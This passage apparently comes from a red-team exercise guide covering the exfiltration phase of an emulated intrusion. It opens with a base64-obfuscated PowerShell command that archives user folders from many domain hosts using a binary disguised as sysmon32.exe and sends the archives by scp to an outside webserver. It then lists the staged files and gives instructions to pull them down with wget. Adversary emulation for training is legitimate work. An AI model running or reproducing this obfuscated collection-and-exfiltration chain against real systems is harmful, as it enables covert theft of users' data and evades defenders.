powershell powershell -e JAB6AD0AIgBNAEQAQQAtAE0AQQBJAEwAIgAsACIATQBEAEEALQBTAEgAUgBQAFQAIgAsACIATQBEAEEALQBTADYALQAwACIALAAiAE0ARABBAC0AUwAzAC0AMQAiACwAIgBNAEQAQQAtAFMAMwAtADAAIgAsACIATQBEAEEALQBDAE0ARAAwACIALAAiAE0ARABBAC0AUwAyAC0AMQAiACwAIgBNAEQAQQAtAFMAMgAtADAAIgAsACIATQBEAEEALQBDAE0ARAAxACIALAAiAE0ARABBAC0AUwAxAC0AMQAiACwAIgBNAEQAQQAtAFMANgAtADEAIgAsACIATQBEAEEALQBTADEALQAwACIALAAiAE0ARABBAC0AUwBRAEwAIgA7ACQAegAgAHwAIAAlACAAewAkAHkAIAA9ACAAWwBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQBdADoAOgBuAGUAdwAoAFsAYgB5AHQAZQBbAF0AXQBbAGMAaABhAHIAWwBdAF0AJABfACkAOwAkAHgAIAA9ACAAKABHAGUAdAAtAEYAaQBsAGUASABhAHMAaAAgAC0ASQBuAHAAdQB0AFMAdAByAGUAYQBtACAAJAB5ACAALQBBAGwAZwBvAHIAaQB0AGgAbQAgAG0AZAA1ACkALgBIAGEAcwBoADsAIABcAFwAbQBkAGEALQBkAGMAMQBcAGYAaQBsAGUAcwBoAGEAcgBlAFwAYQBkAG0AaQBuAFwAdABvAG8AbABzAFwAcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAcwB1AGkAdABlAFwAcwB5AHMAbQBvAG4AMwAyAC4AZQB4AGUAIABhACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAJAB4AC4AZABhAHQAIABcAFwAJABfAFwAQwAkAFwAVQBzAGUAcgBzAFwAKgAgAC0AeAByACEAQQBwAHAAKgA7AHMAYwBwACAALQBvACAAUwB0AHIAaQBjAHQASABvAHMAdABLAGUAeQBDAGgAZQBjAGsAaQBuAGcAPQBuAG8AIAAtAGkAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABpAGQAXwByAHMAYQAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcACQAeAAuAGQAYQB0ACAAagAuAHAAYQBjAGgAZQBjAG8AQAAxADMAOQAuADIANAAyAC4AMQAuADUAOgAvAHYAYQByAC8AdwB3AHcALwBoAHQAbQBsAC8AcAB1AGIAbABpAGMALwAkAHgALgBkAGEAdAB9AA==
```





[[#Phase 4 C2 Rebuild, Domain PrivEsc, Exfiltration|Back to Top]]


## Exfiltrate Files from Webserver
<h1><center> red-ops-kali-1</center></h1>

Whether you've taken a lunch break, a nap, or are finishing this on Day 5, the files should be ready for exfiltration by now. Using your Kali machine, open a web browser and navigate to `http://139.242.1.5`. You should see the Kevin Beacon website.

Using the following list of filenames, pull down the files you've compressed and staged on the webserver:

```
B8275724C88CEE04E03420445275671B.dat
8CAF9CB19054047C94EC6D1D8DDF4F82.dat
69F808083295674B1DAB1A1289B5DEC8.dat
2EB13D7C5A6CBC43FF0964CB898E281C.dat
D2FDEBA8D222F8E43C0D99CC5B591F26.dat
5B0B405841230E64C95A4171A50B5B26.dat
B486D524A1E77D92F9A7FA3531908CCF.dat
6AFAE2E87497A65C6D6DD91A558DE1AE.dat
1013B00A990BC571288E36E669F9E3E7.dat
49EAF4498A983A59F3A8030AB5FF3772.dat
85EB4C15AFD1035843DA220D5A6B13BE.dat
46ECF517A859430B117CB78F5F169984.dat
8021276330CD6A6AB1450F6803626144.dat
```

One option is the shell script `exfiltrate_dat.sh`, which will do this for you using `wget`. Give it execute permissions with `chmod +x /root/exfiltrate_dat.sh`, and then run it.









[[#Phase 4 C2 Rebuild, Domain PrivEsc, Exfiltration|Back to Top]]
